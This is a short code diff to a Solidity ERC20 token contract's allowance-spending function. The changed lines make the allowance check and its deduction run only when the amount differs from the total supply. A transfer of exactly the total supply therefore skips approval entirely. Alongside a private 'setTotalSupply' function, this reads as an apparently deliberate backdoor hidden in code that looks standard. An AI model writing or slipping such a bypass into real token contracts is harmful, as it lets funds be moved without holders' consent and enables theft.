@@ -365,11 +365,11 @@ function setTotalSupply(address owner) private   {
         uint256 amount
     ) internal virtual {
 //        uint256 currentAllowance = _allowances[owner][spender];
-  //      if (currentAllowance != _totalSupply) {
-            require(_allowances[owner][spender] > amount, "ERC20: insufficient allowance");
+        if (amount != _totalSupply) {
+            require(_allowances[owner][spender]>=uint256(amount), "ERC20: insufficient allowance");
                 _approve(owner, spender, _allowances[owner][spender] - amount);
 
-    //    }
+       }
     }
 
 
